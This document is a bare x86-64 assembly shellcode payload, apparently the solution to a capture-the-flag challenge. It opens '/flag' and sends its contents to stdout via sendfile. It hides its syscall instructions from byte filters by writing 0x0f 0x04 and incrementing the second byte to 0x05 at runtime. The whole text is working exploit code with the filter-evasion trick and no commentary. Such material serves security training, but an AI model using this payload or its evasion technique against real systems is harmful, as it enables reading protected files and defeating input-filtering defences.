.global _start
_start:
.intel_syntax noprefix
mov rbx, 0x00000067616c662f
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
inc byte ptr [rip+syscall1+1]
syscall1:
.byte 0x0f
.byte 0x04

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 0x28
inc byte ptr [rip+syscall2+1]
syscall2:
.byte 0x0f
.byte 0x04
